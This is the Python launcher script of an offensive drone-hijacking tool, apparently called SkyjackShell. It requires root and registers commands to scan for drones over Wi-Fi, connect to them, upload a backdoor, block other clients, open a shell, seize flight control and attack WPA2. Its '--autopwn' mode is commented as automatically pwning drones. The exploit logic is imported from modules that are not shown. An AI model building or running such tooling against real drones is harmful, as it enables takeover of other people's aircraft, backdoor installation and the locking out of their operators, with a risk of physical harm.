#!/usr/bin/env python
from lib.skyjackshell import SkyjackShell
from command.samplecommand import SampleCommand
from command.scancommand import ScanCommand
from command.connectcommand import ConnectCommand
from command.backdoorcommand import BackdoorCommand
from command.blockotherscommand import BlockOthersCommand
from command.shellcommand import ShellCommand
from command.tunnelcommand import TunnelCommand
from command.autoflightcommand import Autofligthcommand
from command.manualflightcommand import ManualFlightcommand
from autopwn import pwn
import mpwn
from command.wpa2command import wpa2command
import lib.asyncscapy as ascapy
import os, sys


if __name__ == '__main__':

    autopwn = False
    manualpwn = False
    if os.geteuid() != 0:
        print "This script needs to be run as root"
        sys.exit(1)

    if len(sys.argv) == 2:
        interface = sys.argv[1]
    elif len(sys.argv) == 3 and sys.argv[1] == "--mpwn":
        interface = sys.argv[2]
        manualpwn = True
    elif len(sys.argv) == 3 and sys.argv[2] == "--mpwn":
        interface = sys.argv[1]
        manualpwn = True
    elif len(sys.argv) == 3 and sys.argv[1] == "--autopwn":
        interface = sys.argv[2]
        autopwn = True
    elif len(sys.argv) == 3 and sys.argv[2] == "--autopwn":
        interface = sys.argv[1]
        autopwn = True
    else:
        print "Usage %s <wifi interface> [--autopwn]" % sys.argv[0]
        sys.exit(1)

    skyjack = SkyjackShell()

    # instantiate all commands. the reason this is not done
    # automatically is more flexibility regarding constructor arguments
    scan = ScanCommand(interface)
    connect = ConnectCommand(interface)
    backdoor = BackdoorCommand()
    blockothers = BlockOthersCommand(interface)
    shell = ShellCommand()
    tunnel = TunnelCommand(interface)
    autoflight = Autofligthcommand()
    manualflight = ManualFlightcommand()
    wpa2 = wpa2command()

    # register the commands
    skyjack.register_command(scan)
    skyjack.register_command(connect)
    skyjack.register_command(backdoor) # does only upload the needed files
    skyjack.register_command(blockothers)
    skyjack.register_command(shell)
    #skyjack.register_command(tunnel)
    skyjack.register_command(autoflight)
    skyjack.register_command(manualflight)
    skyjack.register_command(wpa2)

    ascapy.set_interface(interface)

    # start processing commands

    if autopwn:
        # automatically pwn drones
        pwn(interface)
    elif manualpwn:
        mpwn.pwn(interface)
    else:
        done = False
        while not done:
            try:
                skyjack.cmdloop()
                done = True
            except KeyboardInterrupt:
                skyjack.intro = ' '
                pass
